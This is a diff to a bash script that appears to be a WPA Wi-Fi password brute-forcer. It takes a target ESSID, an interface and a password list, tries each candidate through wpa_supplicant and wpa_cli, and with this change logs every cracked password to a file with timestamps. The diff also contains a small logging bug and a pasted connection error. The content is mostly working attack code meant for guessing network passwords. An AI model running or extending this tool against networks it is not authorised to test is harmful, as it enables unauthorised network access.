@@ -7,6 +7,11 @@ green='\e[0;32m'
 blue='\e[0;34m'
 nc='\e[0m'
 
+function getTime(){
+  date +"%H:%M-%d.%m.%Y"
+}
+
+
 ### art ###
 
 echo '
@@ -18,11 +23,19 @@ echo '
  |_|  |_| |\___/|_|_| |_|_|_|   
        _/ |                     
       |__/                      
-                             v1
+                             v1.1
 '
 ### input & variables ###
 
 loc=/tmp/wpa_supplicant.conf
+
+echo -n "Wireless Interface (e.g. wlan0): "
+read int
+
+if [ -z "$int" ]; then
+	echo -e "${red}[x]${nc} Interface required."
+	exit 1
+fi
 
 echo -n "Target ESSID: "
 read ssid
@@ -40,16 +53,21 @@ if [ ! -f "$list" -o -z "$list" ]; then
 	exit 1
 fi
 
-echo -n "Wireless Interface (e.g. wlan0): "
-read int
+echo -n "Enter logfile (full path): "
+read logfile 
 
-if [ -z "$int" ]; then
-	echo -e "${red}[x]${nc} Interface required."
-	exit 1
+if [ -f "$logfile" ];then
+  echo -e "${red}[x]${nc} Logfile found! $logfile. Use other file instead!"
+  exit 1
 fi
 
+time=$(getTime)
+
 echo ""
-echo -e "${blue}[-]${nc} Launching..."
+echo -e "${blue}[-]${nc} Attacking SSID:$ssid"
+echo -e "${blue}[-]${nc} Passwordlist: $list" 
+echo -e "${blue}[-]${nc} Logfile is: $logfile" 
+echo -e "${blue}[-]${nc} Attack started at: $time" 
 
 psk=$(cat $list)
 
@@ -108,7 +126,10 @@ function mainGuess {
 		for i in {1..12}; do
 			netStatus=$(wpa_cli -i${int} status | grep wpa_state | cut -d"=" -f2)
 			if [ "$netStatus" == "COMPLETED" ]; then
-				echo -e "${green}[+] ${nc}$ssid: $psk"
+				echo -e "${green}[+] PASSWORD FOUND: ${nc}$ssid: $psk"
+                                echo "SSID:${nc}ssid,PASSWORD:$psk" >> $logfile
+ 				echo ""
+				echo -e "${blue}[-]${nc} Attack finished at: ".$(getTime)
 				return
 			fi
 			sleep 1
@@ -123,6 +144,8 @@ function cleanUp {
 	rm $loc > /dev/null 2>&1
 }
 
+# Added:
+
 
 killSup
 prepConf
@@ -132,3 +155,10 @@ addNetwork
 mainGuess &
 	wait
 cleanUp
+
+###
+# Chyba:
+# [-] Daemonising wpa_supplicant (PID )
+#[-] Purging network list
+#Failed to connect to non-global ctrl_ifname: wlan0  error: No such file or directory
+
